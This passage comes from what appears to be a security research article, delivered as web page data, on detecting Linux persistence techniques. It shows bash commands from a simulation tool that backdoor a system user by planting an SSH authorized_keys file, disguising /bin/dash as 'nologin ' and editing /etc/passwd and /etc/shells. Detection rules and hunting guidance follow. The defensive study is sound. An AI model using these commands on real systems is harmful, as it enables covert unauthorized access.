file:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As we can see, the root user's home directory is \",(0,n.jsx)(e.code,{children:\"/root/\"}),\", while system users like \",(0,n.jsx)(e.code,{children:\"news\"}),\", \",(0,n.jsx)(e.code,{children:\"backup\"}),\", and \",(0,n.jsx)(e.code,{children:\"nobody\"}),\" also have default home directories, such as \",(0,n.jsx)(e.code,{children:\"/var/spool/news/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/nonexistent/\"}),\". The default shell for root is \",(0,n.jsx)(e.code,{children:\"/bin/bash\"}),\", whereas system users are restricted by \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Although system users are intended to be non-interactive, attackers can exploit their configurations by creating \",(0,n.jsx)(e.code,{children:\".ssh\"}),\" directories in their home directories and adding \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" files for SSH-based authentication. By manipulating the \",(0,n.jsx)(e.code,{children:\"/etc/passwd\"}),\" file and shell configuration, attackers can bypass restrictions imposed by \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin\"}),\" and gain access. The next section will explore this technique in detail, including the steps attackers use to execute it.\"]}),`\n`,(0,n.jsx)(e.h4,{id:\"persistence-through-t1098004----ssh-authorized-keys-backdoored-system-users\",children:\"Persistence through T1098.004 -  SSH Authorized Keys: Backdoored System Users\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Let\\u2019s examine how the PANIX \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7d5bb3892a79fd23d485c3ed82b8fefc81f178e0/modules/setup_backdoor_system_user.sh\",rel:\"nofollow\",children:\"setup_backdoor_system_user.sh\"}),\" module abuses this trick to leverage non-interactive system accounts to gain SSH access onto a target without creating a new user. Refer to the module to inspect the full payloads.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"The first step is to identify a system user as the target for the attack. For example, as we know:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"The \",(0,n.jsx)(e.code,{children:\"news\"}),\" user has \",(0,n.jsx)(e.code,{children:\"/var/spool/news/\"}),\" as its home directory.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"The \",(0,n.jsx)(e.code,{children:\"nobody\"}),\" user has \",(0,n.jsx)(e.code,{children:\"/nonexistent/\"}),\" by default (which can be created).\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The next step is to create the \",(0,n.jsx)(e.code,{children:\".ssh\"}),\" directory within the home directory and writes the attacker\\u2019s public key to the \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" file, and ensure the correct file permissions:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`# Create the .ssh directory\nmkdir -p \"$home_dir/.ssh\"\nchmod 755 \"$home_dir/.ssh\"  # Set directory permissions to be accessible by others\n\n# Write the public key to authorized_keys\necho \"$key\" \u003e \"$home_dir/.ssh/authorized_keys\"\nchmod 644 \"$home_dir/.ssh/authorized_keys\"  # Set file permissions to be readable by others\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This step ensures that the attacker can authenticate via SSH using their private key. The next step is to modify the shell. By default, system users like \",(0,n.jsx)(e.code,{children:\"news\"}),\" and \",(0,n.jsx)(e.code,{children:\"nobody\"}),\" are configured with \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin\"}),\" as their shell, which prevents interactive login sessions. We need to circumvent this restriction by:\"]}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Copying (for example) \",(0,n.jsx)(e.code,{children:\"/bin/dash\"}),\" to \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin\"}),\" (with a trailing space).\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Updating \",(0,n.jsx)(e.code,{children:\"/etc/passwd\"}),\" to include the modified shell path.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`# Copy /bin/dash to '/usr/sbin/nologin '\ncp /bin/dash \"/usr/sbin/nologin \"\n\n# Modify /etc/passwd to include the trailing space in the shell path\nlocal username=$(echo \"$user_entry\" | cut -d: -f1)\nsed -i \"/^$username:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |\" /etc/passwd \n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Where the local username variable can be set to any system user. This subtle manipulation tricks the system into treating \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin \"}),\"(with a trailing space) as a valid shell.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, to ensure SSH accepts the modified shell as valid, we need to add \",(0,n.jsx)(e.code,{children:\"nologin \"}),\"(with a trailing space) to \",(0,n.jsx)(e.code,{children:\"/etc/shells\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`# Check and add \"nologin \" to /etc/shells if not already present\nif ! grep -q \"nologin \" /etc/shells; then\n    echo \"nologin \" \u003e\u003e /etc/shells\n    echo \"[+] Added 'nologin ' to /etc/shells\"\nelse\n    echo \"[+] 'nologin ' already exists in /etc/shells. Skipping.\"\nfi\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"This step ensures SSH does not reject login attempts due to the manipulated shell. Now that we understand the flow, let\\u2019s run the module.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e sudo ./panix.sh --backdoor-system-user --default --key \u003cssh-rsa public key\u003e\n\n[+] Added 'nologin ' to /etc/shells\n[+] Copied /bin/dash to '/usr/sbin/nologin '\n[+] Modified /etc/passwd to update shell path for user: news\n[+] System user backdoor persistence established for user: news\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After which we can log in to the system via SSH with the \",(0,n.jsx)(e.code,{children:\"news\"}),\" user:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e ssh news@192.168.31.129\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-130-generic x86_64)\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"And analyze this technique\\u2019s traces in Discover:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/continuation-on-persistence-mechanisms/image1.png\",alt:\"PANIX backdoor-system-user module execution visualized in Kibana\",title:\"PANIX backdoor-system-user module execution visualized in Kibana\",width:\"1556\",height:\"1127\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Upon PANIX execution, the \",(0,n.jsx)(e.code,{children:\"/var/spool/news/.ssh/\"}),\" directory and \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" files are created and granted the correct permissions (\",(0,n.jsx)(e.code,{children:\"755\"}),\" and \",(0,n.jsx)(e.code,{children:\"644\"}),\" respectively). Next, the \",(0,n.jsx)(e.code,{children:\"/usr/sbin/nologin\"}),\"  (with trailing space) file is created, and the \",(0,n.jsx)(e.code,{children:\"/etc/passwd\"}),\" and \",(0,n.jsx)(e.code,{children:\"/etc/shells\"}),\" files are modified. Upon completion, the \",(0,n.jsx)(e.code,{children:\"news\"}),\" user is able to authenticate via SSH, with an interactive shell.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e sudo ./panix.sh --revert backdoor-system-user\n\n###### [+] Reverting backdoor-system-user module... #####\n\n[+] Removing .ssh directory for user: news\n[+] Successfully removed .ssh directory for news.\n[+] Reverting /etc/passwd entry for user: news\n[+] Successfully reverted /etc/passwd entry for news.\n\n[+] Removing '/usr/sbin/nologin '\n[+] Successfully removed '/usr/sbin/nologin '.\n[+] Reverting /etc/shells to remove 'nologin ' entry.\n[+] Successfully removed 'nologin ' from /etc/shells.\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"After which all artifacts should be cleaned.\"}),`\n`,(0,n.jsx)(e.p,{children:\"There are several detection- and endpoint rules set up to detect different parts of this technique:\"}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Category\"}),(0,n.jsx)(e.th,{children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"IAM\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_ssh_via_backdoored_system_user.toml\",rel:\"nofollow\",children:\"Login via Unusual System User\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Process\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_interactive_shell_from_system_user.toml\",rel:\"nofollow\",children:\"Unusual Interactive Shell Launched from System User\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/195c9611ddb90db599d7ffc1a9b0e8c45688007d/behavior/rules/linux/defense_evasion_potential_nologin_ssh_backdoor.toml\",rel:\"nofollow\",children:\"Potential Nologin SSH Backdoor\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/cross-platform/defense_evasion_masquerading_space_after_filename.toml\",rel:\"nofollow\",children:\"Masquerading Space After Filename\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover backdoored system user persistence\"})}),(0,n.jsx)(e.td,{})]})]})]})}),`\n`,(0,n.jsx)(e.h4,{id:\"hunting-for-t1098004----ssh-authorized-keys-backdoored-system-users\",children:\"Hunting for T1098.004 -  SSH Authorized Keys: Backdoored System Users\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can hunt for this technique using ES|QL and OSQuery by focusing on identifying unauthorized SSH key additions, tampered system files, and unusual activity involving system users such as \",(0,n.jsx)(e.code,{children:\"news\"}),\" or \",(0,n.jsx)(e.code,{children:\"nobody\"}),\". The following key areas are effective for detection:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Suspicious SSH Key Modifications\"}),\": Monitors for changes to \",(0,n.jsx)(e.code,{children:\".ssh\"}),\" directories and \",(0,n.jsx)(e.code,{children:\"authorized_keys\"}),\" files in unexpected locations, such as \",(0,n.jsx)(e.code,{children:\"/var/spool/news/.ssh/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/nonexistent/.ssh/\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Unusual File Changes\"}),\": Identifies modifications to SSH-related files and directories, tracking ownership and access patterns.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Interactive Process Activity\"}),\": Detects rare interactive sessions initiated by system accounts that typically lack login access.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"System File Tampering\"}),\": Flags modifications to \",(0,n.jsx)(e.code,{children:\"/etc/passwd\"}),\" and \",(0,n.jsx)(e.code,{children:\"/etc/shells\"}),\", including unusual shell paths or additions of invalid entries like \",(0,n.jsx)(e.code,{children:\"nologin \"}),\".\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By leveraging the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_ssh_configurations_and_keys.md\",rel:\"nofollow\",children:\"Persistence via SSH Configurations and/or Keys\"}),\" hunt, analysts can uncover unauthorized persistence mechanisms, investigate potential abuse of system accounts, and respond effectively to these threats.\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,n.jsxs)(e.p,{children:['In this third chapter of the \"Linux Detection Engineering\" series, we explored various persistence techniques adversaries might leverage on Linux systems. Starting with dynamic linker hijacking, we demonstrated how manipulation of the dynamic linker through ',(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" can be abused for persistence. We then looked into loadable kernel modules (LKMs), a powerful feature that allows attackers to embed malicious code directly into the kernel, offering deep system control and persistence. We then explored the threat web shells pose, which enable scripting-based persistence and remote access, making them a significant risk in web-exposed environments. Finally, we analyzed the exploitation of default system users with non-interactive shells, revealing how attackers can leverage these often-overlooked accounts to establish persistence without creating new user entries.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"These techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. You can build robust defenses and fine-tune your detection strategies by leveraging \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\" to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided.\"]})]})}function k(i={}){let{wrapper:e}=i.components||{};return e?(0,n.jsx)(e,Object.assign({},i,{children:(0,n.jsx)(a,i)})):a(i)}var _=k;return w(x);})();\n;return Component;"},"_id":"articles/continuation-on-persistence-mechanisms.mdx","_raw":{"sourceFilePath":"articles/continuation-on-persistence-mechanisms.mdx","sourceFileName":"continuation-on-persistence-mechanisms.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/continuation-on-persistence-mechanisms"},"type":"Article","imageUrl":"/assets/images/continuation-on-persistence-mechanisms/continuation-on-persistence-mechanisms.jpg","readingTime":"41 min read","series":"","url":"/continuation-on-persistence-mechanisms","headings":[{"level":2,"title":"Introduction","href":"#introduction"},{"level":2,"title":"Setup note","href":"#setup-note"},{"level":2,"title":"T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking","href":"#t1574006---hijack-execution-flow-dynamic-linker-hijacking"},{"level":3,"title":"T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD","href":"#t1574006---dynamic-linker-hijacking-ld_preload"},{"level":4,"title":"Persistence through T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD","href":"#persistence-through-t1574006---dynamic-linker-hijacking-ld_preload"},{"level":4,"title":"Hunting for T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD ","href":"#hunting-for-t1574006---dynamic-linker-hijacking-ld_preload-"},{"level":2,"title":"T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions","href":"#t1547006---boot-or-logon-autostart-execution-kernel-modules-and-extensions"},{"level":3,"title":"T1014 - Rootkit","href":"#t1014---rootkit"},{"level":4,"title":"Future Work: T1014 - Rootkit","href":"#future-work-t1014---rootkit"},{"level":4,"title":"Persistence through T1547.006 - Kernel Modules and Extensions","href":"#persistence-through-t1547006---kernel-modules-and-extensions"},{"level":6,"title":"[+] Reverting lkm module... #####","href":"#-reverting-lkm-module-"},{"level":4,"title":"Hunting for T1547.006 - Kernel Modules and Extensions","href":"#hunting-for-t1547006---kernel-modules-and-extensions"},{"level":2,"title":"T1505.003 - Server Software Component: Web Shell","href":"#t1505003---server-software-component-web-shell"},{"level":3,"title":"T1505.003 - Web Shell - PHP \u0026 Python","href":"#t1505003---web-shell---php--python"},{"level":4,"title":"Persistence through T1505.003 - Web Shell: PHP \u0026 Python","href":"#persistence-through-t1505003---web-shell-php--python"},{"level":6,"title":"[+] Reverting web-shell module... #####","href":"#-reverting-web-shell-module-"},{"level":4,"title":"Hunting for T1505.003 - Web Shell","href":"#hunting-for-t1505003---web-shell"},{"level":2,"title":"T1098.004 - Account Manipulation: SSH Authorized Keys","href":"#t1098004---account-manipulation-ssh-authorized-keys"},{"level":3,"title":"T1098.004 - SSH Authorized Keys: System User Backdoors","href":"#t1098004---ssh-authorized-keys-system-user-backdoors"},{"level":4,"title":"Persistence through T1098.004 -  SSH Authorized Keys: Backdoored System Users","href":"#persistence-through-t1098004----ssh-authorized-keys-backdoored-system-users"},{"level":6,"title":"[+] Reverting backdoor-system-user module... #####","href":"#-reverting-backdoor-system-user-module-"},{"level":4,"title":"Hunting for T1098.004 -  SSH Authorized Keys: Backdoored System Users","href":"#hunting-for-t1098004----ssh-authorized-keys-backdoored-system-users"},{"level":2,"title":"Conclusion","href":"#conclusion"}],"author":[{"title":"Ruben Groenewoud","slug":"ruben-groenewoud","description":"Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var _=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},a=(e,t,n,u)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let o of g(t))!l.call(e,o)\u0026\u0026o!==n\u0026\u0026s(e,o,{get:()=\u003et[o],enumerable:!(u=d(t,o))||u.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(f(e)):{},a(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),b=e=\u003ea(s({},\"__esModule\",{value:!0}),e);var i=_((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003eh,frontmatter:()=\u003ew});var r=p(i()),w={title:\"Ruben Groenewoud\",description:\"Security Research Engineer, Elastic\",slug:\"ruben-groenewoud\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var h=M;return b(y);})();\n;return Component;"},"_id":"authors/ruben-groenewoud.mdx","_raw":{"sourceFilePath":"authors/ruben-groenewoud.mdx","sourceFileName":"ruben-groenewoud.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/ruben-groenewoud"},"type":"Author","imageUrl":"","url":"/authors/ruben-groenewoud"}],"category":[{"title":"Detection science","slug":"detection-science","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var c=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)c(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026c(t,o,{get:()=\u003ee[o],enumerable:!(s=f(e,o))||s.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(d(t)):{},i(e||!t||!t.__esModule?c(n,\"default\",{value:t,enumerable:!0}):n,t)),D=t=\u003ei(c({},\"__esModule\",{value:!0}),t);var u=j((h,a)=\u003e{a.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Detection science\",slug:\"detection-science\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"categories/detection-science.mdx","_raw":{"sourceFilePath":"categories/detection-science.mdx","sourceFileName":"detection-science.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/detection-science"},"type":"Category","url":"/categories/detection-science"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"continuation-on-persistence-mechanisms"},"buildId":"zogrVZn0K5OKWEKPLKPt5","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>